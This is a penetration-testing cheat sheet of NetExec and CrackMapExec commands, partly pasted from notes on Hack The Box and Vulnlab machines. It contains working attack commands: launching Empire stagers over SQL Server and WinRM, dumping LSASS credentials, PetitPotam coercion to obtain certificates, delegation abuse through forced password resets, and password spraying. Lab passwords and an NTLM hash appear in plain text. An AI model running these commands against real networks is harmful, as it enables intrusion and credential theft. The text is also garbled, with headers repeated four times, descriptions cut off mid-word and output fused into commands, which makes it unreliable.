Queries AD Sites and Services to enumerate all **IP subnets** registered in the domain. This provides a complete map of the organization's known network ranges directly from Active Directory.

```
nxc ldap <dc> -u <user> -p <password> -M subnets
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - groupmembership
#cat/RECON #cpts
Queries the **group membership** of a specified user or computer account across all AD groups, including nested group membership. Faster and easier than manually traversing memberOf chains.

```
nxc ldap <dc> -u <user> -p <password> -M groupmembership -o USER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - whoami
#cat/RECON #cpts
Returns the **effective identity and group memberships** of the currently authenticated account as seen by the DC. Useful for confirming the privilege level of the account being used.

```
nxc ldap <dc> -u <user> -p <password> -M whoami
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - bloodhound
#cat/RECON #cpts
Runs the **BloodHound ingestor** directly via NetExec, collecting all AD data (users, groups, computers, GPOs, sessions, ACLs, trusts) needed to build the BloodHound attack path graph. Supports both **BloodHound Communit

```
nxc ldap <dc> -u <user> -p <password> -M bloodhound
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - bloodhound-2
#cat/RECON #cpts
Runs the **BloodHound ingestor** directly via NetExec, collecting all AD data (users, groups, computers, GPOs, sessions, ACLs, trusts) needed to build the BloodHound attack path graph. Supports both **BloodHound Communit

```
nxc ldap <dc> -u <user> -p <password> -M bloodhound -o COLLECTION_METHOD=All
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - entra_id
#cat/RECON #cpts
Enumerates the presence and configuration of **Microsoft Entra Connect (Azure AD Connect)** within the domain. Identifies the synchronization server, which can then be targeted with the `msol` module to extract the MSOL

```
nxc ldap <dc> -u <user> -p <password> -M entra_id
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - msol-ldap-variant
#cat/RECON #cpts
Works with the `entra_id` module to retrieve or act on the **MSOL synchronization account** information. Also available as an SMB module (see above), with the LDAP variant providing a different interaction vector.

```
nxc ldap <dc> -u <user> -p <password> -M msol
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - mssql_priv
#cat/RECON #cpts
Enumerates and exploits **SQL Server privilege escalation paths**. Checks for `sysadmin` role membership, `EXECUTE AS LOGIN` abuses, SQL Agent job manipulation, and linked server trust chains. Can automatically escalate

```
nxc mssql <target> -u <user> -p <password> -M mssql_priv
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - mssql_priv-2
#cat/RECON #cpts
Enumerates and exploits **SQL Server privilege escalation paths**. Checks for `sysadmin` role membership, `EXECUTE AS LOGIN` abuses, SQL Agent job manipulation, and linked server trust chains. Can automatically escalate

```
nxc mssql <target> -u <user> -p <password> -M mssql_priv -o ACTION=privesc
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - empire_exec-mssql-variant
#cat/RECON #cpts
Executes a **PowerShell Empire** stager via `xp_cmdshell` on the remote SQL Server instance. Requires `xp_cmdshell` to be enabled or the user to have the privileges to enable it.

```
nxc mssql <target> -u <user> -p <password> -M empire_exec -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - empire_exec-winrm-variant
#cat/RECON #cpts
Delivers and executes a **PowerShell Empire** agent payload via WinRM. Leverages the PowerShell Remoting session to run the stager in the target's PowerShell environment.

```
nxc winrm <target> -u <user> -p <password> -M empire_exec -o LISTENER=
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - lsassy-winrm-variant
#cat/RECON #cpts
Dumps LSASS credentials over a **WinRM session** using the lsassy library. Functionally identical to the SMB variant but uses the WinRM transport instead.

```
nxc winrm <target> -u <user> -p <password> -M lsassy
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - ssh-info-host-info
#cat/RECON #cpts
While not a dedicated module in the traditional sense, the SSH protocol handler automatically enumerates **OS version, hostname, and sudo privileges** upon successful authentication.

```
nxc ssh <target> -u <user> -p <password>
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - 09---seenabledelegationprivilege
#cat/RECON #cpts
We know we cannot add a DNS record and machine account from our previous enumeration. This means we cannot configure unconstrained delegation because we need to force the machine to craft a Kerberos ticket, which isn't p

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - 09---seenabledelegationprivilege-2
#cat/RECON #cpts
We know we cannot add a DNS record and machine account from our previous enumeration. This means we cannot configure unconstrained delegation because we need to force the machine to craft a Kerberos ticket, which isn't p

```
export KRB5CCNAME=HELEN.FROST.ccache
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - 09---seenabledelegationprivilege-3
#cat/RECON #cpts
We know we cannot add a DNS record and machine account from our previous enumeration. This means we cannot configure unconstrained delegation because we need to force the machine to craft a Kerberos ticket, which isn't p

```
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set password "FS01$" 'Password1!'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - 09---seenabledelegationprivilege-4
#cat/RECON #cpts
We know we cannot add a DNS record and machine account from our previous enumeration. This means we cannot configure unconstrained delegation because we need to force the machine to craft a Kerberos ticket, which isn't p

```
netexec smb redelegate.vl -u FS01$ -p 'Password1!'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - 09---seenabledelegationprivilege-5
#cat/RECON #cpts
We know we cannot add a DNS record and machine account from our previous enumeration. This means we cannot configure unconstrained delegation because we need to force the machine to craft a Kerberos ticket, which isn't p

```
bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set object FS01$ msDSAllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - fluffy
#cat/RECON #cpts
extrait du PDF Joplin: fluffy

```
crackmapexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares SMB 10.10.11.69 445 DC01 Share Permissions Remark SMB 10.10.11.69 445 DC01 ----- ----------- ------ SMB 10.10.11.69 445 DC01 IT
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - fluffy-2
#cat/RECON #cpts
extrait du PDF Joplin: fluffy

```
crackmapexec ldap 10.10.11.69 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - vulncicada
#cat/RECON #cpts
extrait du PDF Joplin: vulncicada

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - vulncicada-2
#cat/RECON #cpts
extrait du PDF Joplin: vulncicada

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - vulncicada-3
#cat/RECON #cpts
extrait du PDF Joplin: vulncicada

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares SMB DC-JPQ225.cicada.vl 445 DC-JPQ225 [ + ] cicada.vl\Rosie.Powell:Cicada123
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - vulncicada-4
#cat/RECON #cpts
extrait du PDF Joplin: vulncicada

```
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER = DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD = PetitPotam [*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized" [*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized" [*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK" [*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED [*] Requesting certificate for '\\' based on the template 'DomainController' [*] HTTP
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
nxc smb 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur-2
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
netexec smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -d voleur.htb -k -- generate-krb5-file voleur.krb5
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur-3
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
echo '[libdefaults] dns_lookup_kdc = false dns_lookup_realm = false default_realm = VOLEUR.HTB [realms] VOLEUR.HTB = { kdc = dc.voleur.htb admin_server = dc.voleur.htb default_domain = voleur.htb } Foothold Now we use the -k option to force Kerberos authentication and check available SMB shares. Here, Kerberos authentication will be used instead of NTLM. We have
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur-4
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur-5
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k --share IT -- get-file 'First-Line Support\\Access_Review.xlsx' Access_Review.xlsx
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur-6
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
nxc smb DC.voleur.htb -u user.txt -p pass.txt -k --continue-on-success
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - voleur-7
#cat/RECON #cpts
extrait du PDF Joplin: voleur

```
nxc smb dc.voleur.htb -u todd.wolfe -p NightT1meP1dg3on14 -d VOLEUR.htb -k --shares
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - redelegate
#cat/RECON #cpts
extrait du PDF Joplin: redelegate

```
netexec mssql 10.129.234.50 -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - redelegate-2
#cat/RECON #cpts
extrait du PDF Joplin: redelegate

```
netexec winrm redelegate.vl -u HELEN.FROST -p 'Password1!'
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - redelegate-3
#cat/RECON #cpts
extrait du PDF Joplin: redelegate

```
netexec smb redelegate.vl -u FS01
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - freelancer
#cat/RECON #cpts
extrait du PDF Joplin: freelancer

```
nxc winrm freelancer.htb -u usernames.list -p passwords.list WINRM 10.129.20.59 5985 DC
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - freelancer-2
#cat/RECON #cpts
extrait du PDF Joplin: freelancer

```
nxc smb freelancer.htb -u usernames.list -p passwords.list SMB 10.129.20.59 445 DC [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE SMB 10.129.20.59 445 DC
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - freelancer-4
#cat/RECON #cpts
extrait du PDF Joplin: freelancer

```
nxc smb freelancer.htb -u liza.kazanof -p passwords.list -d freelancer.htb SMB 10.129.20.59 445 DC
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - freelancer-5
#cat/RECON #cpts
extrait du PDF Joplin: freelancer

```
nxc winrm freelancer.htb -u liza.kazanof -p 'Passw0rd!' -d freelancer.htb WINRM 10.129.20.42 5985 DC
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - analysis
#cat/RECON #cpts
extrait du PDF Joplin: analysis

```
crackmapexec smb analysis.htb -u users.txt -p "DMrB8YUcC5%2"
```

## NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - NetExec (nxc) - rebound
#cat/RECON #cpts
extrait du PDF Joplin: rebound

```
Get-DomainObjectAcl -Identity Servicemgmt ObjectDN : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb ObjectSID : S-1-5-21-4078382237-1492182817-2568127209-7683 ACEType : ACCESS_ALLOWED_ACE ACEFlags : None ActiveDirectoryRights : Self AccessMask : 0x8 InheritanceType : None SecurityIdentifier : oorend (S-1-5-21-4078382237-1492182817-2568127209- 7682) pipx install git+https://github.com/Pennyw0rth/NetExec netexec smb dc01.rebound.htb -u usernames.txt -p '1GR8t@$$4u' --continue-on- success
```

